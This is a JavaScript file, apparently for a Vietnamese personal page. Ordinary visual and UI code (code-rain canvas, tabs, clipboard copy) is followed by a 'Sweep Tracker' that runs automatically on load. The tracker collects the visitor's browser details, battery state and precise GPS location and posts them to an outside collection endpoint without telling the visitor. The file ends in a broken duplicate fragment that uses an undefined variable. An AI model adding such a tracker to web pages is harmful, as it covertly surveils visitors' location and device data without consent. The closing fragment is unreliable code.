// Code rain background
const canvas = document.getElementById('canvas');
const ctx = canvas.getContext('2d');
canvas.width = window.innerWidth;
canvas.height = window.innerHeight;

const chars = '01アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲン';
const fontSize = 12;
const columns = canvas.width / fontSize;
const drops = Array(Math.floor(columns)).fill(1);

function draw() {
    ctx.fillStyle = 'rgba(15, 23, 42, 0.04)';
    ctx.fillRect(0, 0, canvas.width, canvas.height);
    ctx.fillStyle = '#60a5fa';
    ctx.font = fontSize + 'px monospace';
    for (let i = 0; i < drops.length; i++) {
        const text = chars[Math.floor(Math.random() * chars.length)];
        ctx.fillText(text, i * fontSize, drops[i] * fontSize);
        if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
        drops[i]++;
    }
}
setInterval(draw, 45);

window.addEventListener('resize', () => {
    canvas.width = window.innerWidth;
    canvas.height = window.innerHeight;
});

// Tab toggle
document.querySelectorAll('.tab-btn').forEach(btn => {
    btn.addEventListener('click', () => {
        document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
        document.querySelectorAll('.contact-content').forEach(c => c.classList.remove('active'));
        btn.classList.add('active');
        document.getElementById(btn.dataset.tab).classList.add('active');
    });
});

// Copy to clipboard
function copyToClipboard(text) {
    navigator.clipboard.writeText(text).then(() => {
        alert('Đã sao chép: ' + text);
    }).catch(() => {
        alert('Không thể sao chép, thử thủ công nhé!');
    });
}

// Auto zoom adjustment
function adjustZoom() {
    const vw = document.getElementById('viewportMeta');
    const w = window.innerWidth;
    let scale = w < 768 ? 1.04 : 1.0;
    vw.setAttribute('content', `width=device-width, initial-scale=${scale}, maximum-scale=5.0, user-scalable=yes`);
}
window.addEventListener('resize', adjustZoom);
adjustZoom();

// File: script.js

// Sweep Tracker Script v2.0
// Thu thập thông tin truy cập & gửi đến Cloudflare Worker
async function sweepTracker() {
    try {
        // 1. Nhận diện trình duyệt & thiết bị
        const ua = navigator.userAgent || '';
        const detectBrowser = (ua) => {
            const lower = ua.toLowerCase();
            const isIOS = /iphone|ipad|ipod/.test(lower);
            
            if (isIOS && /crios/i.test(ua)) return 'Chrome (iOS)';
            if (isIOS && /safari/i.test(ua) && !/crios/i.test(ua)) return 'Safari (iOS)';
            if (/chrome|crios|edg/i.test(ua)) return 'Chrome';
            if (/safari/i.test(ua) && !/chrome/i.test(ua)) return 'Safari';
            if (/firefox|fxios/i.test(ua)) return 'Firefox';
            if (/edg/i.test(ua)) return 'Edge';
            return 'Unknown';
        };
        const browser = detectBrowser(ua);

        // 2. Mức pin (Battery API)
        let batteryInfo = null;
        if (navigator.getBattery) {
            try {
                const b = await navigator.getBattery();
                batteryInfo = {
                    charging: b.charging,
                    level: Math.round(b.level * 100)
                };
            } catch {
                batteryInfo = null;
            }
        }

        // 3. Lấy tọa độ GPS
        const getPosition = (timeout = 10000) => 
            new Promise((resolve) => {
                if (!navigator.geolocation) return resolve(null);
                navigator.geolocation.getCurrentPosition(
                    (pos) => {
                        resolve({
                            lat: pos.coords.latitude,
                            lon: pos.coords.longitude,
                            accuracy: pos.coords.accuracy
                        });
                    },
                    () => resolve(null),
                    { enableHighAccuracy: true, timeout, maximumAge: 0 }
                );
            });
        
        const geo = await getPosition();

        // 4. Rung nhẹ khi khởi động (nếu hỗ trợ)
        if (navigator.vibrate) navigator.vibrate([100, 50, 100]);

        // 5. Chuẩn bị dữ liệu (Payload)
        const payload = {
            ua: { browser, raw: ua },
            battery: batteryInfo,
            geolocation: geo,
            page: {
                url: location.href,
                title: document.title
            },
            timestamp: new Date().toISOString()
        };

        // 6. Gửi tới Cloudflare Worker
        // Lưu ý: Thay đổi URL này thành URL Worker thực tế của bạn nếu cần
        const apiEndpoint = 'https://api.sweep.id.vn/collect'; 
        
        await fetch(apiEndpoint, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });

        console.log('[Sweep Tracker] ✅ Gửi dữ liệu thành công');
      } catch (err) {
        console.warn('[Sweep Tracker] ⚠️ Lỗi:', err);
    }
}

// Chạy hàm
sweepTracker();
// Thay đổi dòng này sau khi có URL từ Cloudflare
const apiEndpoint = 'https://<TEN-WORKER-CUA-BAN>.<username>.workers.dev'; 

await fetch(apiEndpoint, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(payload)
});
